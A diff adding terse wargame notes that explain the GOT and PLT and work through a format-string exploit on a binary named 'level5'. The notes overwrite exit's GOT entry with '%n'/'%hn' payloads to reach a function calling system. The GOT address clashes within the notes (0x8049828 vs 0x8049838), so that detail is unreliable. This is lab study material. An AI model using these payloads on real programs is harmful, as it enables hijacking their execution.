@@ -1,0 +1,58 @@
+GOT = global offset table which hold addr of functions that are dynamically linked
+
+important :
+GOT contains pointer to libraries which move arroud due to ASLR
+GOT is writable
+
+PLT
+Before a functions address has been resolved, the GOT points to an entry in the Procedure Linkage Table (PLT). This is a small "stub" function which is responsible for calling the dynamic linker with (effectively) the name of the function that should be resolved.
+
+
+gdb ./level5
+
+disas n
+0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+disas 0x80483d0
+ 0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838
+ 0x080483d6 <+6>:	push   0x28
+ 0x080483db <+11>:	jmp    0x8048370
+
+entry point for exit in GOT is -> 0x8049828
+
+find the offset
+
+python -c 'print "AAAA" + "%x " * 10' | ./level5
+
+we can find the offset, 4
+
+lets try to overwrite the exit entrypoint
+
+gdb ./leve5
+
+breakpoint at 0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+run < <(python -c 'print "\x38\x98\x04\x08" + "%4$n"')
+x 0x8049828
+0x8049828 <exit@got.plt>:	0x00000004
+
+it work
+
+we can now redirect to the function o which call system with the same technique as previous level
+gdb info functions
+0x080484a4  o
+
+lets do it with 2 bytes write
+
+0x0804 - 84a4
+find padding
+0x84a4 - 0x8
+0x0804 - 0x84a4
+we can use this little trick to overflow it
+0x10804 - 0x84a4
+
+add padding and win
+
+cat <(python -c 'print "\x38\x98\x04\x08" + "\x3a\x98\x04\x08" + "%33948x" + "%4$hn" + "%33632x"+  "%5$hn"') - | ./level5
+
+
